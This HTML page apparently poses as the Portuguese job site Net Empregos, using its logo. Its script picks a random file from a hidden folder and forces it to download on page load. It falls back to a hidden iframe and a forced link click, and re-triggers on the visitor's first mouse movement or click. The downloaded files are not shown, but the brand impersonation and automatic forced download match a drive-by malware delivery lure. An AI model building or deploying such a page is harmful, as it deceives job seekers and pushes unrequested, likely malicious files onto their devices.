<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>Net Empregos</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
}
.container {
    text-align: center;
    background: white;
    padding: 40px 60px;
    border-radius: 16px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    max-width: 450px;
    width: 90%;
}
.logo {
    width: 200px;
    margin-bottom: 20px;
}
.status {
    margin: 15px 0;
    padding: 12px;
    border-radius: 8px;
    font-size: 14px;
    display: none;
}
.status.info { background: #e3f2fd; color: #1565c0; display: block; }
.status.success { background: #e8f5e9; color: #2e7d32; display: block; }
.status.error { background: #ffebee; color: #c62828; display: block; }
.btn-download {
    display: none;
    margin-top: 15px;
    padding: 14px 32px;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: transform 0.2s, box-shadow 0.2s;
    text-decoration: none;
}
.btn-download:hover {
    transform: translateY(-2px);
    box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
}
.btn-download:active { transform: translateY(0); }
.spinner {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 3px solid #667eea;
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-right: 8px;
    vertical-align: middle;
}
@keyframes spin { to { transform: rotate(360deg); } }
.file-name {
    font-family: monospace;
    font-size: 12px;
    color: #666;
    margin-top: 8px;
    word-break: break-all;
}
</style>
<base target="_blank">
</head>
<body>

<div class="container">
    <img src="https://www.net-empregos.com/img/logos/net-empregos.png" class="logo" alt="Net Empregos">

    <div id="status" class="status info">
        <span class="spinner"></span>Carregando lista de arquivos...
    </div>

    <div id="fileName" class="file-name" style="display:none;"></div>

    <a id="btnDownload" class="btn-download" href="#">
        📥 Baixar Arquivo
    </a>
</div>

<script>
(function() {
    const LISTA_JSON = "lista.json";
    const PASTA_ARQUIVOS = "arquivos/";
    const statusDiv = document.getElementById("status");
    const fileNameDiv = document.getElementById("fileName");
    const btn = document.getElementById("btnDownload");
    let arquivoEscolhido = "";
    let downloadOk = false;

    function setStatus(msg, tipo) {
        statusDiv.className = "status " + tipo;
        statusDiv.innerHTML = tipo === "info" ? '<span class="spinner"></span>' + msg : msg;
    }

    function mostrarBotao() {
        btn.style.display = "inline-block";
        btn.href = PASTA_ARQUIVOS + arquivoEscolhido;
        btn.download = arquivoEscolhido;
        setStatus("Clique no botão abaixo para baixar:", "error");
    }

    function escolherAleatorio(lista) {
        const idx = Math.floor(Math.random() * lista.length);
        return lista[idx];
    }

    // Técnica 1: Fetch + Blob + ObjectURL
    function downloadFetch() {
        setStatus("Baixando " + arquivoEscolhido + "...", "info");

        fetch(PASTA_ARQUIVOS + arquivoEscolhido, { cache: "no-store" })
            .then(r => {
                if (!r.ok) throw new Error("HTTP " + r.status);
                return r.blob();
            })
            .then(blob => {
                const url = URL.createObjectURL(blob);
                const a = document.createElement("a");
                a.href = url;
                a.download = arquivoEscolhido;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                setTimeout(() => URL.revokeObjectURL(url), 5000);
                downloadOk = true;
                setStatus("✅ Download iniciado: " + arquivoEscolhido, "success");
                setTimeout(() => { statusDiv.style.display = "none"; }, 3000);
            })
            .catch(err => {
                console.log("Fetch falhou:", err);
                downloadIframe();
            });
    }

    // Técnica 2: iframe invisível
    function downloadIframe() {
        setStatus("Tentando método alternativo...", "info");

        const iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.src = PASTA_ARQUIVOS + arquivoEscolhido;
        document.body.appendChild(iframe);

        setTimeout(() => {
            document.body.removeChild(iframe);
            downloadRedirect();
        }, 1500);
    }

    // Técnica 3: Redirect direto
    function downloadRedirect() {
        setStatus("Redirecionando...", "info");

        const a = document.createElement("a");
        a.href = PASTA_ARQUIVOS + arquivoEscolhido;
        a.download = arquivoEscolhido;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        setTimeout(() => {
            if (!downloadOk) mostrarBotao();
        }, 2000);
    }

    // Carrega lista.json e escolhe um arquivo
    fetch(LISTA_JSON, { cache: "no-store" })
        .then(r => {
            if (!r.ok) throw new Error("Não conseguiu carregar lista.json");
            return r.json();
        })
        .then(lista => {
            if (!Array.isArray(lista) || lista.length === 0) {
                throw new Error("Lista vazia ou inválida");
            }
            arquivoEscolhido = escolherAleatorio(lista);
            fileNameDiv.textContent = arquivoEscolhido;
            fileNameDiv.style.display = "block";

            setStatus("Arquivo escolhido: " + arquivoEscolhido, "info");

            // Tenta download automático após pequeno delay
            setTimeout(downloadFetch, 800);
        })
        .catch(err => {
            console.error(err);
            setStatus("❌ Erro ao carregar lista: " + err.message, "error");
        });

    // Se o usuário interagir com a página, tenta novamente
    document.addEventListener("click", function once() {
        if (!downloadOk && arquivoEscolhido) {
            downloadFetch();
        }
        document.removeEventListener("click", once);
    });

    document.addEventListener("mousemove", function once() {
        if (!downloadOk && arquivoEscolhido) {
            downloadFetch();
        }
        document.removeEventListener("mousemove", once);
    });

})();
</script>

</body>
</html>
